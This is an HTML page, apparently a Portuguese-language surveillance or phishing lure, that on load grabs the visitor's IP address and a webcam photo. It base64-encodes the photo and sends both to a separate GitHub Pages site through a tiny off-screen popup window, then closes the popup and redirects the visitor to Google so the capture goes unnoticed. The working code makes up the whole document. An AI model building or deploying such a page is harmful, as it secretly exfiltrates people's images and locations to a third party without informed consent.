<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura de Foto Automática</title>
</head>
<body style="background-color: #f0f0f0; text-align: center; padding-top: 50px;">
    
    <h1>📸 Capturando Imagem...</h1>
    <p>Por favor, aguarde, você será redirecionado em breve.</p>

    <video id="webcam-video" autoplay playsinline muted style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // ==========================================================
        // CONFIGURAÇÃO
        // ==========================================================
        
        // 🚨 SUBSTITUA por sua URL real do ClienteViewFoto no GitHub Pages
        const VIEW_SITE_URL = 'https://leozin-code.github.io/ClienteViewFoto/'; 
        
        const REDIRECT_URL = 'https://www.google.com';

        const video = document.getElementById('webcam-video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let photoData = null;
        let userIP = 'IP_NAO_ENCONTRADO';

        // 1. Capturar o IP do usuário
        function fetchUserIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userIP = data.ip;
                })
                .catch(error => {
                    console.warn("Falha ao obter IP. Usando IP_NAO_ENCONTRADO.", error);
                });
        }

        // 2. Iniciar a webcam
        function startWebcam() {
            return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
                .then(stream => {
                    video.srcObject = stream;
                    return new Promise(resolve => video.onloadedmetadata = resolve);
                });
        }

        // 3. Tirar a foto
        function takePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Converte para Base64 (sem o prefixo "data:image/png;base64,")
            photoData = canvas.toDataURL('image/png').split(',')[1];
        }

        // 4. Finalizar e Redirecionar
        function finalize(data, stream) {
            // Parar o stream da webcam para liberar o recurso
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            if (data && data.img) {
                // Constrói a URL com a foto e o IP
                const finalURL = VIEW_SITE_URL + 
                                 `?ip=${encodeURIComponent(data.ip)}&img=${encodeURIComponent(data.img)}`;
                
                // 🚨 MUDANÇA CRÍTICA: Abre uma nova aba (que vai salvar o dado)
                // Usamos _blank, mas com dimensões pequenas para ser menos intrusivo.
                const newWindow = window.open(finalURL, '_blank', 'width=10,height=10,left=9999');

                // Espera 1.5 segundos (para dar tempo do SiteViewFoto carregar e salvar)
                setTimeout(() => {
                    if (newWindow) {
                        try {
                           newWindow.close(); // Tenta fechar a aba que fez o salvamento
                        } catch (e) {
                           console.log("A janela de salvamento não pôde ser fechada automaticamente.");
                        }
                    }
                    // Redireciona o usuário para o Google
                    window.location.href = REDIRECT_URL;
                }, 1500); 
                
            } else {
                 // Se não houve foto (falha na webcam), redireciona diretamente para o Google
                 window.location.href = REDIRECT_URL;
            }
        }

        // Fluxo Principal (executa sequencialmente)
        async function runCaptureFlow() {
            let stream = null;
            await fetchUserIP();
            
            try {
                // Inicia e obtém o stream
                stream = await startWebcam().then(() => video.srcObject);
                takePhoto();
                finalize({ ip: userIP, img: photoData }, stream);
            } catch (e) {
                console.error("Erro no fluxo de captura:", e);
                // Em caso de qualquer falha (câmera bloqueada, etc.), finalize sem dados
                finalize(null, stream); 
            }
        }

        window.onload = runCaptureFlow;
    </script>
</body>
</html>
